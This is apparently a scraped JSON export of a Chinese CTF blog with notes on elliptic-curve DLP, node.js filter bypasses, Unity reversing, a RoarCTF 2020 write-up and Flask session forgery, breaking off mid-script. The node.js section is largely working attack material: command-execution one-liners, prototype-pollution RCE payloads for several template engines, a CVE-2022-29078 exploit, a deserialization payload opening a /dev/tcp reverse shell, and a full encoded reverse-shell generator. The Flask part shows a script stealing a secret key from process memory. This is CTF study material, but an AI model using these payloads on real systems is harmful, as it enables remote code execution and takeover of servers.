$\\sqrt{p}$，但是这个数依然很大，所以不能用。这时可以考虑Pohlig-hellman方法能不能起作用。 1234567891011121314151617181920212223242526272829303132def bsgs(g, y, p): m = int(ceil(sqrt(p - 1))) S = &#123;&#125; point = (u,0) for i in range(m): point = point + g pointg = point[0] &lt;&lt; 800 | point[1] S[pointg] = i gs = m * g for i in range(m): pointy = y[0] &lt;&lt; 800 | y[1] if pointy in S: return S[pointy] - i * m + 1 y = y + gs return Nonedef Pohlig_Hellman(G,P): ea = [] na = [] for i in range(len(fac)): c = fac[i] n = (p - 1) // c gi = n * G yi = n * P ei = bsgs(gi,yi,c) ea.append(ei%c) na.append(c) ee = crt(ea,na) return eee = Pohlig_Hellman(G,P) ​ 其他映射Montgomery型 -&gt; Weierstrass型$By^2=x^3+Ax^2+x \\longmapsto v^2=u^3+au+b$其中： $(x,y) \\longmapsto (u,v)=\\Big(\\cfrac{x}{B}+\\cfrac{A}{3B},\\cfrac{y}{B}\\Big)$ $a=\\cfrac{3-A^2}{3B^2},b=\\cfrac{2A^3-9A}{27B^3}$ 参考：Montgomery curve ​ $x^2 - Dy^2 = k^2$ 型 将曲线上的DLP问题转化为模p的DLP问题 性质： 满足 $(p+1)G=(1,0)$，阶为 $p+1$。 曲线其实是一个 $\\text{GF}(p)$ 上的pell方程，而pell方程的解可以通过以下方法得到： $x_i+y_i\\sqrt{n}=(x_1+y_1\\sqrt{n})^i$ 或递推关系式： $\\begin{cases} x_{i+1}=x_1x_i+ny_1y_i \\newline y_{i+1}=x_1y_i+y_1x_i \\end{cases}$ 对矩阵 $\\begin{bmatrix} x_1 &amp; Dy_1 \\newline y_1 &amp; x_1\\end{bmatrix}$ 进行对角化，可以得到其特征值为 $Dy+x,-Dy+x$，之后求得 $x_n = \\cfrac{(y_1\\sqrt D + x_1)^n + (-y_1\\sqrt D + x_1)^n}{2 u^{n-1}}, y_n = \\cfrac{(y_1\\sqrt D + x_1)^n - (-y_1\\sqrt D + x_1)^n}{2 \\sqrt Du^{n-1}}$ 容易得到 $\\cfrac{x_n - \\sqrt D y_n}{ u} = \\Big(\\cfrac{x_1 - \\sqrt D y_1}{u} \\Big) ^ n, \\cfrac{x_n + \\sqrt D y_n}{ u} = \\Big(\\cfrac{x_1 + \\sqrt D y_1}{u}\\Big) ^ n$ 即找到了两个将曲线上点映射到 GF 的映射 $f: f(x, y) = \\cfrac{x - \\sqrt D y}{ u}, g: g(x, y) = \\cfrac{x + \\sqrt D y}{ u}$ 此时，利用hackergame2020的OT中的技巧，且 $D$ 已知，对于每一个点，可以得到 $x - \\sqrt D y$，得到两组数据后相除，即可得到 $\\cfrac{x_{1n} + \\sqrt D y_{1n}}{ x_{2n} + \\sqrt D y_{2n}} = \\Big(\\cfrac{x_1 + \\sqrt D y_1}{x_2 + \\sqrt D y_2}\\Big) ^ n$ 对这两个数通过Pohlig Hellman算法求DLP，即可得到 $e$。 参考： DUCTF 2021 - yadlp D^3CTF 2021 - EasyCurve SUSCTF 2022 - SpecialCurve3 ​ $x^2+e\\cdot y^2=N$ 型性质： 形如$4\\cdot k + 1$的素数$p$可以被分解为如下的二平方和： x^2+y^2=p\\quad x,y\\in\\mathbb{N}其证明方法有很多，这里给出一种较为有趣的证明方法。 $\\textbf{Proof}$ 首先注意到$-1$为模$p$的二次剩余，这里我们设$e$满足：$e^2\\equiv-1\\bmod p$。 然后我们构造格$\\mathcal{L}$，其格基矩阵如下： $M = \\begin{bmatrix}1 &amp; e\\\\0 &amp; p\\\\\\end{bmatrix}$ 对于其中的向量$\\vec{t}=\\vec{v}\\cdot M=(x_0,y_0)\\cdot M=(x_1,y_1)$ 有$x_1=x_0,y_1=e\\cdot x_0+p\\cdot y_0$，考虑其范数，有 \\Vert \\vec{t}\\Vert=x_0^2+(e\\cdot x_0+p\\cdot y_0)^2=(e^2+1)\\cdot x_0^2 + p^2\\cdot y_0^2 + 2\\cdot e\\cdot p\\cdot x_0\\cdot y_0两边模$p$，得到$\\Vert \\vec{t} \\Vert \\equiv 0 \\bmod p$，也就是说对于格$\\mathcal{L}$中的任意一个向量$\\vec{t}$，均有$\\Vert \\vec{t}\\Vert=k\\cdot p$。 考虑格$\\mathcal{L}$中的最短非零向量，尝试估计其长度。 因为有$\\det(M)=p$，所以格$\\mathcal{L}$中的最短非零向量长度满足$0&lt;\\Vert \\vec{t_0} \\Vert^2 &lt; 2\\cdot p$。 综上有$\\Vert \\vec{t_0} \\Vert^2 = x_0^2 + y_0^2 = p$。证明完毕。 注：上面的证明过程其实提供了一种求解方程$x^2+y^2=p$的有效算法：在格$\\mathcal{L}$中利用格基规约算法去寻找短向量。 有了上面的theorem和proof，对于丢番图方程$x^2+e\\cdot y^2 = N$，可以尝试几乎完全相同的方法去求解。 其他： 在sympy中，有个 cornacchia() 函数专门求解此类方程，即 cornacchia(1,e,n)。","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"曲线","slug":"曲线","permalink":"https://lazzzaro.github.io/tags/%E6%9B%B2%E7%BA%BF/"}],"author":"Lazzaro"},{"title":"node.js绕过","slug":"web-node-js绕过","date":"2020-12-20T17:07:23.000Z","updated":"2025-04-24T12:50:26.758Z","comments":true,"path":"2020/12/21/web-node-js绕过/","permalink":"https://lazzzaro.github.io/2020/12/21/web-node-js%E7%BB%95%E8%BF%87/","excerpt":"","text":"​ req.body =&gt; POST/PUT请求 req.params =&gt; 类似 /api/getUserListById/:id 路由，如 http://localhost:3000/giraffe/1 req.query =&gt; GET请求，如 http://localhost:3000/animals?page=10 ​ 绕过toUpperCase() / toLowerCase()特殊字符 &#39;ı&#39;.toUpperCase()=&#39;I&#39;，&#39;ſ&#39;.toUpperCase()=&#39;S&#39;，&#39;K&#39;.toLowerCase()=&#39;k&#39; parseInt()parseInt() 接收字符串参数并转为整形数据类型，但如果目标是 Node 中的 big int，转换时会造成精度损失，但能绕过正常的大小比较。 ​ 命令执行 (RCE)12Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString() 绕过关键词obj.constructor：obj[&quot;constr&quot;+&quot;uctor&quot;]，obj[&quot;constru&quot;.concat(&quot;ctor&quot;)]，String.fromCharCode(xxx) this：eval(&quot;th&quot;+&quot;is&quot;) __proto__：constructor.prototype 模板字符串：$&#123;&#39;xxx&#39;&#125; ​ 原型链污染原理对于语句 object[a][b] = value 如果可以控制a, b, value的值，将a设置为 __proto__， 就可以给object对象的原型设置一个b属性，值为value，这样所有继承object对象原型的实例对象会在本身不拥有b属性的情况下，都会拥有b属性，且值为value。 常用污染函数merge() 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; clone() 123function clone(obj) &#123; return merge(&#123;&#125;, obj);&#125; copy() 123456789function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125;&#125; 常见模板引擎ejs12345678910111213141516171819202122232425262728291.outputFuncitonName字段：&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;); __tmp2&quot;&#125;&#125;&#125;2.escapeFunction字段：&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;,&quot;compileDebug&quot;:true,&quot;debug&quot;:true&#125;&#125;&#125;3.destructuredLocals字段：&#123;&quot;__proto__&quot;:&#123;&quot;destructuredLocals&quot;:[&quot;a=a;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);//var __tmp2&quot;]&#125;&#125;4.localsName字段：&#123;&quot;__proto__&quot;:&#123;&quot;localsName&quot;:&quot;x=global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;&#125;&#125;5.escape字段：&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:1,&quot;escape&quot;:&quot;escapeFn;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;&#125;&#125;SSTI&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;) %&gt;CVE-2022-29078（ejs &lt;= v3.1.9）参考：https://inhann.top/2023/03/26/ejs/EXP:?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync(&quot;touch /tmp/3.txt&quot;);&amp;settings[view%20options][client]=truePOC:&#123;&quot;settings&quot;:&#123;&quot;view options&quot;:&#123;&quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\\&quot;child_process\\&quot;).execSync(\\&quot;touch /tmp/pwned\\&quot;);&quot;,&quot;client&quot;:&quot;true&quot;&#125;&#125;&#125; 参考： 从西湖Easyjs讨论nodejs引擎RCE jade1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \\&quot;\\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);//&quot;&#125;&#125;&#125; lodash1&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\u000aglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;dir&#x27;,function()&#123;&#125;);&quot;&#125;&#125; nunjucks1234567891011&#123;&#123;range.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)()&#125;&#125;&#123;&#123;range.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&quot;)()&#125;&#125;&#123;&#123;&#x27;string&#x27;.toString.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)()&#125;&#125;&#123;&#123;&#x27;string&#x27;.constructor.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)()&#125;&#125;绕过：（使用unicode编码和`+`字符串拼接绕过关键字的过滤，用 `[]` 来绕过 `.`）&#123;&#123;&quot;string&quot;[&quot;toSt&quot;+&quot;ring&quot;][&quot;const&quot;+&quot;ructor&quot;](&quot;return(global[\\&quot;\\\\u0070\\\\u0072\\\\u006f\\\\u0063\\\\u0065\\\\u0073\\\\u0073\\&quot;][\\&quot;\\\\u006d\\\\u0061\\\\u0069\\\\u006e\\\\u004d\\\\u006f\\\\u0064\\\\u0075\\\\u006c\\\\u0065\\&quot;][\\&quot;\\\\u0072\\\\u0065\\\\u0071\\\\u0075\\\\u0069\\\\u0072\\\\u0065\\&quot;](\\&quot;\\\\u0063\\\\u0068\\\\u0069\\\\u006c\\\\u0064\\\\u005f\\\\u0070\\\\u0072\\\\u006f\\\\u0063\\\\u0065\\\\u0073\\\\u0073\\&quot;)[\\&quot;\\\\u0065\\\\u0078\\\\u0065\\\\u0063\\\\u0053\\\\u0079\\\\u006e\\\\u0063\\&quot;](\\&quot;id\\&quot;)[\\&quot;\\\\u0074\\\\u006f\\\\u0053\\\\u0074\\\\u0072\\\\u0069\\\\u006e\\\\u0067\\&quot;]())&quot;)()&#125;&#125; putil_mergeCVE-2021-23470 ​ 反序列化node-serialize模块CVE-2017-59411&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1\\&quot;&#x27;,function(error,stdout, stderr) &#123; console.log(stdout) &#125;);\\n &#125;()&quot;&#125; 构造： nodejshell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# Generator for encoded NodeJS reverse shells# Based on the NodeJS reverse shell by Evilpacket# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)# Insecurety Research (2013) - insecurety.netimport sysif len(sys.argv) != 3: print &quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot; % (sys.argv[0]) sys.exit(0)IP_ADDR = sys.argv[1]PORT = sys.argv[2]def charencode(string): &quot;&quot;&quot;String.CharCode&quot;&quot;&quot; encoded = &#x27;&#x27; for char in string: encoded = encoded + &quot;,&quot; + str(ord(char)) return encoded[1:]print(&quot;[+] LHOST = %s&quot; % (IP_ADDR))print(&quot;[+] LPORT = %s&quot; % (PORT))NODEJS_REV_SHELL = &#x27;&#x27;&#x27;var net = require(&#x27;net&#x27;);var spawn = require(&#x27;child_process&#x27;).spawn;HOST=&quot;%s&quot;;PORT=&quot;%s&quot;;TIMEOUT=&quot;5000&quot;;if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;function c(HOST,PORT) &#123; var client = new net.Socket(); client.connect(PORT, HOST, function() &#123; var sh = spawn(&#x27;/bin/sh&#x27;,[]); client.write(&quot;Connected!\\\\n&quot;); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on(&#x27;exit&#x27;,function(code,signal)&#123; client.end(&quot;Disconnected!\\\\n&quot;); &#125;); &#125;); client.on(&#x27;error&#x27;, function(e) &#123; setTimeout(c(HOST,PORT), TIMEOUT); &#125;);&#125;c(HOST,PORT);&#x27;&#x27;&#x27; % (IP_ADDR, PORT)print(&quot;[+] Encoding&quot;)PAYLOAD = charencode(NODEJS_REV_SHELL)print(&quot;eval(String.fromCharCode(%s))&quot; % (PAYLOAD)) ​ SQL注入mysqljs/mysql模块1username=admin&amp;password[password]=1 参考： Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"Unity逆向","slug":"reverse-Unity逆向","date":"2020-12-13T12:28:32.000Z","updated":"2024-06-25T12:23:50.695Z","comments":true,"path":"2020/12/13/reverse-Unity逆向/","permalink":"https://lazzzaro.github.io/2020/12/13/reverse-Unity%E9%80%86%E5%90%91/","excerpt":"","text":"​ 工具Unity Dll一般的 Unity3D 游戏的主逻辑都在 Assembly-CSarp.dll 中，所以需要 dll文件逆向/重新打包 工具。Unity3D开发的游戏，其核心代码都在这个 dll 文件中，所以逆向/修改这个 dll 文件就可以了。 ILSpyhttps://github.com/icsharpcode/ILSpy 用于查看dll程序逻辑。 ILDASM用于反编译dll文件，生成il文件(存放了dll反编译后的指令)和res文件(反编译后的资源文件)，可以安装Windows SDK或者从网上下载。 ilasm.NET4.0自带，位置在 C:\\Windows\\Microsofr.NET\\Framework\\v4.0.30319\\ilasm.exe。 ​ Unity il2cppUnity 程序为了防止大量的外挂和盗版游戏，推出了一种 il2cpp 的操作，大概就是让 C# 的中间代码 IL 转换成 C++ 来编译，最后生成汇编程序使得反编译难度大大增加。 Il2CppDumperhttps://github.com/Perfare/Il2CppDumper 还原DLL文件（不包含代码），可用于提取MonoBehaviour和MonoScript 使用方法 直接运行Il2CppDumper.exe并依次选择il2cpp的可执行文件GameAssembly.dll和global-metadata.dat（文件头 AF 1B B1 FA）文件，然后根据提示输入相应信息。程序运行完成后将在当前运行目录下生成输出文件。 命令 Il2CppDumper.exe &lt;executable-file&gt; &lt;global-metadata&gt; &lt;output-directory&gt; 输出文件 123456Wulin-Dump:.│ dump.cs│ il2cpp.h│ script.json│ stringliteral.json└─DummyDll IDA 先把GameAssembly.dll分析完。 安装IDAPython（IDA7.0及以上自带，吾爱有现成的，记得要添加环境变量 PYTHONPATH） IDA左上角 File -&gt;Script File… -&gt;Il2CppDumper 目录下的ida_with_struct.py，后面依次选择之前dump出来的script.json和il2cpp.h，等待脚本执行完成，中间可能会有警告和报错，直接无视。 开始分析，符号都已经加载好了，只不过从原来的CSharp变成了cpp，需要一定逆向功底。 参考： [IL2CPP逆向] 某立志传 - 脱离Steam运行 frida-il2cpp-bridge https://github.com/vfsfitvnm/frida-il2cpp-bridge 按照官方文档安装，然后注入下面的脚本，得到 dump.cs 12345import &quot;frida-il2cpp-bridge&quot;;Il2Cpp.perform(() =&gt; &#123; console.log(Il2Cpp.unityVersion); Il2Cpp.dump(&quot;dump.cs&quot;, &quot;./&quot;)&#125;); 分析dump.cs，搜索 Assembly-CSharp，发现了Check这个类，下面有个CheckFlag，接 着用ida分析一下，rva 是 0x0027d460 1234567891011// Assembly-CSharpclass Check : UnityEngine.MonoBehaviour&#123; System.Void Start(); // 0x0027d670 System.Void Update(); // 0x0027d670 System.Void OnClick(); // 0x0027d4e0 System.Boolean CheckFlag(System.String input); // 0x0027d460 static System.String AESEncrypt(System.String text, System.String key, System.String iv); // 0x0027d200 static System.String AESDecrypt(System.String text, System.Byte[] key, System.Byte[] iv); // 0x0027d000 System.Void .ctor(); // 0x0027d680&#125; ida分析CheckFlag (Imagebase + RVA)，根据dump.cs里的RVA恢复一下符号，可以看到 加密只有一个简单的AES，那么只要拿到key和iv就行了，因为字符串信息都是保存在 global-metadata.dat里的，所以在GameAssembly.dll 里是无法得到的，可以直接调试分 析得到。 接着使用frida-il2cpp-bridge的Tracer来追踪一下String类 123456import &quot;frida-il2cpp-bridge&quot;;Il2Cpp.perform(() =&gt; &#123; console.log(Il2Cpp.unityVersion); const String = Il2Cpp.corlib.class(&quot;System.String&quot;); Il2Cpp.trace(true).classes(String).and().attach();&#125;); 注入，随便输点击一下按钮，就得到密文了。","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"Unity","slug":"Unity","permalink":"https://lazzzaro.github.io/tags/Unity/"}],"author":"Lazzaro"},{"title":"RoarCTF 2020","slug":"match-RoarCTF-2020","date":"2020-12-06T13:10:56.000Z","updated":"2020-12-12T13:36:47.734Z","comments":true,"path":"2020/12/06/match-RoarCTF-2020/","permalink":"https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/","excerpt":"","text":"​ 由嘶吼主办的2020 RoarCTF线上赛，平台：https://ctf.4hou.com/。 Rank: 27 赛后无环境复现，故每题未写上flag值。 Misc签到题不属于Misc分类也不像签到题的签到题。 F12查看源码，发现/?url，需要GET方式传url。 尝试目录穿越及远程请求数据无效，发现file伪协议/?url=file:///etc/passwd能成功回显内容， 读index.php源码：/?url=file:///var/www/html/index.php，内容为PHP curl实现，过滤了flag关键字。 利用PHP的二次编码解析bug（bypass strpos verification）编码即可绕过过滤： Payload:/?url=file:///fla%2567 ​ Hi_433MHzRF射频信号数据，以原始数据方式导入Audacity查看波形，放大， 发现摩斯密码，对照可能的flag字符串摩斯密码--..--./--.--../--....-/--..---，开头四段去掉前后的.是吻合的，手工记录所有段解密得flag。 ​ FMFM调频信号数据，以原始数据方式导入Audacity查看波形未查出有用信息。 搜索可查看FM信号的软件，首先尝试用SDR#打开，设定好2MHz的采样率，调整频率至幅值最高处，能勉强听到人声，但噪声太大，官方原生版SDR#也未找到比较好的去噪滤波功能。 换一个软件，找到Windows平台SDR软件全家桶PothosSDR，使用里面的GQRX SDR分析，功能齐全，导入后调整 Mode=Narrow FM 及 Filter width=Wide，可以清晰听出内容，报的就是flag。 ​ CryptoCrypto_System从CyBRICS 2020 - Too Secure魔改的Pedersen加密，算法描述： 已知信息 $m_1,m_2$和 $m_1$ 的 $r_1$，$m_1$ 通过因子 $r_1$ 加密得到 $c_1$，需要求出因子 $r_2$，使得 $m_2$ 通过 $r_2$ 加密得到的 $c_2$ 与 $c_1$ 相同，即产生碰撞。 对于待加密信息 $m_1$，$c_1=g^{m_1}h_1^{r_1}$，注意到 $h_1=g^{a_1}$，故 $c_1=g^{m_1+a_1r_1}$； 要碰撞信息 $m_2$ 的因子 $r_2$ 应满足 $c_2=c_1$，即 $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod {\\varphi(p)}$， 又 $q$ 为 $g$ 的阶，所以有 $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod q$， 故 $r_2 \\equiv (m_1+a_1r_1-m_2) \\pmod q$，即可求出 $r_2$。 Exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#python2from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256from Crypto.Util.number import *import hashlibfrom gmpy2 import gcd,invertdef brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)p = 12039102490128509125925019010000012423515617235219127649182470182570195018265927223g = 10729072579307052184848302322451332192456229619044181105063011741516558110216720725def int2str(data, mode=&quot;big&quot;): if mode == &quot;little&quot;: return sum([ord(data[_]) * 2 ** (8 * _) for _ in range(len(data))]) elif mode == &quot;big&quot;: return sum([ord(data[::-1][_]) * 2 ** (8 * _) for _ in range(len(data))])def get_parameter(m): x = int2str(m, &#x27;little&#x27;) y = pow(g, x, p) a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, &quot;\\0&quot;)).digest()) b = pow(a, a, p - 1) h = pow(g, b, p) return x, y, h, bdef sign(m, r): x, y, h, b = get_parameter(m) s = (y * pow(h, r, p)) % p return sdef verify(m, r, s): x, y, h, b = get_parameter(m) if s == ((y * pow(h, r, p)) % p): return True else: return Falser=remote(&#x27;139.129.98.9&#x27;,30001)data = r.recvline()prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvuntil(&#x27;Give me XXXX:&#x27;)r.sendline(brute_force(prefix,s))r.recvline()r.recvline()m1 = long_to_bytes(int(parse(&quot;Here is the frist message(64 bytes):&#123;&#125;&quot;,r.recvline())[0],16))m2 = long_to_bytes(int(parse(&quot;Here is the second message(64 bytes):&#123;&#125;&quot;,r.recvline())[0],16))r1 = int(parse(&quot;The frist message&#x27;s &#x27;r&#x27;:&#123;&#125;&quot;,r.recvline())[0])print(m1)print(m2)#sage solve order q: g^q=1(mod p) q = 1039300813886545966418005631983853921163721828798787466771912919828750891assert(pow(g, q, p) == 1)assert(gcd(q, p-1) == q)M1,y1,h1,b1 = get_parameter(m1)M2,y2,h2,b2 = get_parameter(m2)s1 = sign(m1, r1)p1 = b1*r1p2 = M2-M1p3 = p1-p2p4 = invert(b2,q)r2 = (p3*p4)%qs2 = sign(m2,r2)if s1==s2: print(&#x27;r1 = &#x27;+str(r1)) print(&#x27;r2 = &#x27;+str(r2)) print(&#x27;s1 = &#x27;+str(s1)) print(&#x27;s2 = &#x27;+str(s2)) print(&#x27;verify(m2,r2,s2) = &#x27;+str(verify(m2,r2,s2)))r.recvuntil(&#x27;Please choice your options:&#x27;)r.sendline(&#x27;3&#x27;)r.sendlineafter(&#x27;Please give me the (r,s) of the second message:&#x27;,&#x27;(&#x27;+str(r2)+&#x27;,&#x27;+str(s2)+&#x27;)&#x27;)print(r.recvall()) ​ Reverse task.py 12345678910111213141516171819202122232425from Crypto.Util.number import *from gmpy2 import *from secret import *assert(flag.decode().startswith(&#x27;flag&#123;&#x27;)) and (flag.decode().endswith(&#x27;&#125;&#x27;))def reverse(x): y = 0 while x != 0: y = y*2 + x%2 x = x // 2 return ywhile True: p = getStrongPrime(512) q = reverse(p) if is_prime(q): breakn = p*qe = 65537m = bytes_to_long(flag)enc = powmod(m,e,n)#n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889#enc = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745 ASIS 2015 - RSASR魔改， $q$ 是 $p$ 的2进制反素数（emirp数），bin(q)=bin(p)[::-1]。 利用回溯算法按位从最高位端向中间爆破。 Exp： 123456789101112131415161718192021222324252627282930313233#python2n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889def t(a, b, k): # sqrt(n)有512位2进制位, 需计算高低位每边的256位 if k == 256: if a*b == n: print(a, b) return for i in xrange(2): for j in xrange(2): # 对两个素数因子尝试爆破未遍历的位爆破 a1 = a + i*(2**k) + j*(2**(511-k)) b1 = b + j*(2**k) + i*(2**(511-k)) if a1*b1 &gt; n: # 当a1和b1过大 continue if (a1+(2**(511-k)))*(b1+(2**(511-k))) &lt; n: # 当a1和b1过小 continue if ((a1*b1)%(2**(k+1))) != (n%(2**(k+1))): # 当a1*b1的最后k+1位（不变）与n的最后k+1位不同 continue # 满足条件的(a1,b1)值，尝试继续遍历 t(a1, b1, k+1)# 两个素数因子有512位2进制位, 尝试可能的所有中间位for i in xrange(2): t(i*(2**256), i*(2**256), 0) #output:#(13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L, 11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L)#(11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L, 13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L) 求出 $p,q$ 值，按照RSA计算方法求出 $m$ 即为flag。 1234567891011import gmpy2p = 11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943q = 13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423n = p*qfn = (p-1)*(q-1)e = 65537c = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745d = gmpy2.invert(e,fn)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))#flag","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"python绕过","slug":"web-python绕过","date":"2020-11-14T14:53:02.000Z","updated":"2024-10-28T13:21:03.973Z","comments":true,"path":"2020/11/14/web-python绕过/","permalink":"https://lazzzaro.github.io/2020/11/14/web-python%E7%BB%95%E8%BF%87/","excerpt":"","text":"​ 绕过常见绕过os.path.join()如果一个参数是以/符号开头的，就将这个参数作为开头继续向后拼接。 os.path.join(&#39;uploads/&#39;, &#39;/flag&#39;) =&gt; &#39;/flag&#39; render_template()模板渲染，缓存机制：首先会检查是否有缓存，如果缓存可用就使用缓存，缓存不可用就加载模板。 Cache_size 默认是 400，使用 LRUCache，默认将最常用的页面缓存起来，便于之后的使用，每次访问页面都会将这个页面放到cache的最前方，同时，处于cache后方的页面，由于长期得不到访问，在超过cache规定的最大限制之后，将会被移除出缓存中。 ​ SSTI见SSTI。 ​ session伪造在Flask中，session是保存在Cookie中，也就是本地，所以可以直接读取其内容，也就产生了Flask伪造session的漏洞。 secret keypython存储对象的位置在堆上。 app是实例化的Flask对象，而secret key在 app.config[&#39;SECRET_KEY&#39;]，可以通过读取 /proc/self/mem 来读取secret key。 读取堆栈分布由于 /proc/self/mem 内容较多而且存在不可读写部分，直接读取会导致程序崩溃，所以先读取 /proc/self/maps 获取堆栈分布。 12345678map_list = requests.get(url + f&quot;info?file=&#123;bypass&#125;/proc/self/maps&quot;)map_list = map_list.text.split(&quot;\\\\n&quot;)for i in map_list: map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(&quot;Found rw addr:&quot;, start, &quot;-&quot;, end) 读取对应位置内存数据然后读取 /proc/self/mem，读取对应位置的内存数据，再使用正则表达式查找内容。 12345res = requests.get(f&quot;&#123;url&#125;/info?file=&#123;bypass&#125;/proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot;)if &quot;*abcdefgh&quot; in res.text: secret_key = re.findall(&quot;[a-z0-9]&#123;32&#125;\\*abcdefgh&quot;, res.text) if secret_key: print(&quot;Secret Key:&quot;, secret_key[0]) 完整利用123456789101112131415161718192021222324252627import requestsimport 